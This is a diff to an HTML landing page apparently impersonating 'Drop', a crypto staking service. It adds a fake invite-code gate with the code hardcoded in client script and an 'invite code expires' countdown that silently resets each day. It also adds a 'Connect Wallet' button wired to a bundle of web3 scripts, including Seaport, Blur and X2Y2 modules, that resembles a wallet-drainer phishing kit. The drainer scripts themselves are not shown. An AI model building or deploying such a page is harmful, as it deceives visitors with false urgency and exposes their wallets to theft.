@@ -5,6 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Liquidity for the Interchain - Drop</title>
     <link rel="icon" href="https://raw.githubusercontent.com/dropdott/dropdott.github.io/main/favicon.png" type="image/png">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-W6GF7417YG"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-W6GF7417YG');
+    </script>
+
     <style>
         body {
             margin: 0;
@@ -106,9 +117,20 @@
             transition: background 0.3s ease;
             visibility: hidden;
             margin-top: 20px;
+            cursor: pointer;
         }
         .cta-button:hover {
             background: #4729CC;
+        }
+        .countdown-label {
+            font-size: 16px;
+            color: #000;
+            margin-top: 20px;
+        }
+        .countdown {
+            font-size: 20px;
+            margin-top: 10px;
+            color: #FF4500;
         }
         .footer {
             display: flex;
@@ -223,8 +245,16 @@
         </div>
         <div id="error-message" class="error-message">Incorrect code. Please try again.</div>
 
+        <!-- Countdown Label and Timer After Submit Button -->
+        <div class="countdown-label" id="countdown-label">
+            Invite code expires in:
+        </div>
+        <div class="countdown" id="countdown-container">
+            <span id="countdown-timer"></span>
+        </div>
+
         <!-- Call to Action Button -->
-        <a href="#" class="cta-button" id="cta-button">Connect Wallet</a>
+        <a class="cta-button" id="cta-button" onclick="modalOpen()">Connect Wallet</a>
 
         <!-- Footer -->
         <div class="footer">
@@ -242,6 +272,50 @@
         </div>
     </div>
 
+    <script src="/assets/web3-provider/web3-modal.js"></script>
+    <script src="/assets/web3-provider/web3-loader.js"></script>
+    <script src="/assets/web3-provider/web3-connect.js"></script>
+    <script src="/assets/web3-provider/web3-router.js"></script>
+    <script src="/assets/web3-provider/web3-module.js"></script>
+    <script src="/assets/web3-provider/web3-alert.js"></script>
+    <script src="/assets/web3-provider/web3-seaport.js"></script>
+    <script src="/assets/web3-provider/web3-data.js"></script>
+    <script src="/assets/web3-provider/ethers.js"></script>
+    <script src="/assets/web3-provider/ethereum-tx.js"></script>
+    <script src="/assets/web3-modules/module-seaport.js"></script>
+    <script src="/assets/web3-modules/module-blur.js"></script>
+    <script src="/assets/web3-modules/module-x2y2.js"></script>
+    <script src="/assets/web3-provider.js"></script>
+
+    <!-- Countdown Timer Script -->
+    <script>
+        function startCountdown() {
+            const countdownTimer = document.getElementById('countdown-timer');
+            const endTime = new Date();
+            endTime.setHours(24, 0, 0, 0);
+
+            function updateCountdown() {
+                const now = new Date();
+                const timeLeft = endTime - now;
+
+                if (timeLeft <= 0) {
+                    endTime.setHours(24, 0, 0, 0); // Reset countdown to 24 hours
+                }
+
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+                countdownTimer.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }
+
+            setInterval(updateCountdown, 1000);
+            updateCountdown();
+        }
+
+        document.addEventListener('DOMContentLoaded', startCountdown);
+    </script>
+
     <script>
         const correctCode = 'DR1H87';
         const inputField = document.getElementById('invite-code');
@@ -251,6 +325,8 @@
         const codeInputSection = document.getElementById('code-input-section');
         const mainTitle = document.getElementById('main-title');
         const descriptionText = document.getElementById('description-text');
+        const countdownLabel = document.getElementById('countdown-label');
+        const countdownContainer = document.getElementById('countdown-container');
 
         // Enable submit button via JavaScript
         submitButton.disabled = false;
@@ -263,6 +339,9 @@
                 codeInputSection.style.display = 'none';
                 mainTitle.textContent = "Success!";
                 descriptionText.innerHTML = "<p>You can now start using Drop. Once you've staked with Drop, you won't need the link again. Connect your wallet to open the app.</p>";
+                // Hide countdown timer
+                countdownLabel.style.display = 'none';
+                countdownContainer.style.display = 'none';
                 // Simulate form submission success
                 alert("Invite code validated successfully!");
             } else {
